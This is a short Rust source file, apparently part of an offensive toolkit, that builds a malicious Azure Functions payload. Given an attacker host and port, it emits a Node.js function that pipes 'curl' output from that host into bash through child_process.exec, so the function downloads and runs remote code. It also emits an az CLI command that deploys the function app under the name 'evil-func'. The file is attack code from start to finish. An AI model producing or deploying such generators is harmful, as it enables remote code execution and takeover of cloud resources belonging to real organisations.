// Azure Functions payload generator
use crate::cli::banner;

pub struct AzureGenerator;

impl AzureGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str) -> String {
        banner::print_exploiting("AZURE-PAYLOAD", &format!("{}:{}", lhost, lport));
        
        format!(
            r#"module.exports = async function (context, req) {{
  const https = require('https');
  const payload = 'curl -s http://{}:{}/payload.sh | bash';
  require('child_process').exec(payload);
  context.res = {{ status: 200, body: 'done' }};
}};

az functionapp create --resource-group myRG --consumption-plan-location eastus --name evil-func --storage-account mystorage"#,
            lhost, lport
        )
    }
}
